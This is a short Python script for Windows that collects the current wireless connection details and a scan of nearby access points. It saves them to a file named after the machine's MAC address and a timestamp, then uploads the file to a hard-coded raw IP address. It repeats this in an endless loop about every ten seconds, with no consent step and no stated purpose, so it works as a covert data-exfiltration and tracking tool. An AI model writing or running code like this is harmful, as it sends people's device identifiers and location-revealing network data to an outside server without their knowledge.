import pprint
import sys,threading

sys.path.append('../')
import uuid,time,requests
from win32wifi import Win32Wifi

def timp(nu):
    time.sleep(nu)
    return 0
def get_mac_address():

    mac=uuid.UUID(int = uuid.getnode()).hex[-12:]

    return ":".join([mac[e:e+2] for e in range(0,11,2)])
def uupload(filename):
    url = "http://122.112.252.115:80"
    files = {'file': open(filename, 'rb')}
    r = requests.post(url, files=files)
    print( r.text)
def getpcmsg():
    ifaces = Win32Wifi.getWirelessInterfaces()
    pp = pprint.PrettyPrinter(indent=4)
    for iface in ifaces:
        guid = iface.guid
        res = Win32Wifi.queryInterface(iface, "current_connection")  # wlan_intf_opcode_current_connection
        ct = pp.pformat(res[1])
        fi=ct
        #print (ct)
    for iface in ifaces:
        fi=fi+'\n'+str(iface)
        #print(iface)
        guid = iface.guid
        bsss = Win32Wifi.getWirelessNetworkBssList(iface)
        #print()
        fi=fi+"\n\nscanmessage:"
        for bss in bsss:
            #print(bss)
            #print("-" * 20)
            fi=fi+'\n'+str(bss)+("-"*20)
        print()
    #print(fi)
    mac=get_mac_address().replace(':','-')
    time1=time.strftime('%Y-%m-%d-%H-%M-%S',time.localtime(time.time()))
    print (time1)
    fn=mac+'_'+time1+'.txt'
    output = open(mac+'_'+time1+'.txt', 'w')
    output.write(fi)
    output.close
    uupload(fn)
if __name__ == "__main__":
    while(1):
        threads=[]
        t1=threading.Thread(target=getpcmsg,args=())
        threads.append(t1)
        t2=threading.Thread(target=timp,args=(10,))
        threads.append((t2))
        for t in threads:
            t.setDaemon(True)
            t.start()
        t.join()
        print ("once")

